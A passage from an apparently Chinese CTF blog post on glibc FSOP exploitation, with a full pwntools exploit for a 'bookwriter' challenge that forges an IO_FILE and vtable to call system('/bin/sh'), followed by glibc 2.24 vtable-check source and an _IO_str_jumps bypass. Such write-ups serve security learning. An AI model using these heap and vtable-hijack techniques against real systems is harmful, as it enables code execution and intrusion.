attack</strong>往IO_list_all中写入main_arena+0x58</p><p>由于_chain字段在_IO_FILE中的偏移是0x68</p><p>那么就会将真实大小为0x60chunk的bk字段视为_chain字段,故该bk需指向fake_IO_FILE</p><p>所以fake_IO_FILE需要被加入0x60的smallbin中,并确保是最后一个chunk</p><p>一般是触发从unsortedbin往外取出,放入smallbin后,继续取出(IO_list_all-0x10)但因为大小不通过检测,触发malloc_printer,以此getshell</p><p>IO_list_all-0x10视为chunk的话size字段是空的(固定内存)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                           chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>不过在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。会验证 vtable 是否位于_IO_vtable 段中,这就使得这种办法失效了</p><h2 id="实战pwnable-bookwriter"><a href="#实战pwnable-bookwriter" class="headerlink" title="实战pwnable_bookwriter"></a>实战pwnable_bookwriter</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bw&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>libc是2.23</p><p>主要漏洞点:</p><ol><li>根据内存判断应该只能存储8个book,但是add函数判断时是if(a&gt;8)结合函数功能会将一个book的size覆写为一个地址(一个很大的数值)</li><li>edit函数后会将book的size根据新输入的字符串调整,如果和下一个chunk的size连接起来就可以多写一个字节到下一个chunk</li><li>author长度为0x40时,可以向下继续泄露地址</li></ol><p>利用核心:</p><ol><li>这题没有free功能,要想泄露libc就要对topchunk动手脚(本体可以修改其大小,再申请一个比修改后的size大的大小,使topchunk加入unsortedbin)</li><li>具体的漏洞利用实现要用到FSOP</li><li>topchunk在这道题中非常关键</li></ol><p>实现过程:</p><ol><li>泄露heap</li><li>通过topchunk进入unsortedbin泄露libc</li><li>第0个chunk大数字写伪造io_file和vtable</li><li>申请chunk利用unsortedbin attack写IO_file,并让fake_iofile加入到smallbin链并成功进入fake_io_list_all,并因为unsortedbin链损坏触发malloc_printer以此getshell</li></ol><p>触发trigger(将IO_list_all-0x10视为chunk起始的话,size==0)</p><p><strong>exp:</strong>(有小概率失败,可能是ASLR的影响)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf= ELF(<span class="string">&quot;./bw&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./bw&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;page :&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Author :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)  <span class="comment">#top chunk size edit</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xe1\x0f\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(yes:1 / no:0) &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#add top chunk to unsorted bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">view(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">libc_addr  = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_base: &#x27;</span>, <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_addr:&#x27;</span>, <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;system: &#x27;</span>,<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;heap: &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;_IO_list_all: &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x2b0</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">vtable = heap_addr + <span class="number">0x2b0</span> +<span class="number">0xe0</span></span><br><span class="line">payload += p64(vtable)</span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,data + payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Size of page :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="2-24后新机制下利用"><a href="#2-24后新机制下利用" class="headerlink" title="2.24后新机制下利用"></a>2.24后新机制下利用</h1><h2 id="变化"><a href="#变化" class="headerlink" title="变化"></a>变化</h2><p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在<strong>调用虚函数之前</strong>首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算 <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>，紧接着会判断 vtable - <strong>start_</strong>libc_IO_vtables 的 offset ，如果这个 offset 大于 section_length , 即大于 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 那么就会调用 <code>_IO_vtable_check()</code> 这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 vtable 是非法的，那么会引发 abort。</p><p><u>在加入这个限制后,对vtable的利用几乎难以实现</u></p><p><u>故将视线转向IO_FILE本身</u></p><p>当然这些利用在之前的版本亦有效</p><hr><p>不过这个检查其实并不是非常严格</p><p>如果只是在vtable所在段内进行劫持并不一定会触发错误</p><h3 id="fileno-与缓冲区的相关利用"><a href="#fileno-与缓冲区的相关利用" class="headerlink" title="fileno 与缓冲区的相关利用"></a>fileno 与缓冲区的相关利用</h3><p>_IO_FILE 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 fwrite、fread 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。</p><p>因为三个标准流的存在</p><p>无需文件操作,直接利用scanf\printf便可以进行利用。</p><p>其中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p><h2 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h2><p>libc.so中还存在其他的无检查的vtable如_IO_str_jumps和_IO_wstr_jumps,其中前者的绕过更为简单</p><p>以前者为例,源码位于bits/strops.c中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们能设置文件指针的 <code>vtable</code> 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数。</p><p><strong>出现的结构体</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">void</span> *(*_IO_alloc_type) (_IO_size_t);</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*_IO_free_type)</span> <span class="params">(<span class="type">void</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is needed for the Irix6 N32 ABI, which has a 64 bit off_t type,</span></span><br><span class="line"><span class="comment">   but a 32 bit pointer type.  In this case, we get 4 bytes of padding</span></span><br><span class="line"><span class="comment">   after the vtable pointer.  Putting them in a structure together solves</span></span><br><span class="line"><span class="comment">   this problem.  */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">f</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass 由上一句能看出一般会通过</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//call qword ptr [fp+0xe0] 参数是new_size</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span 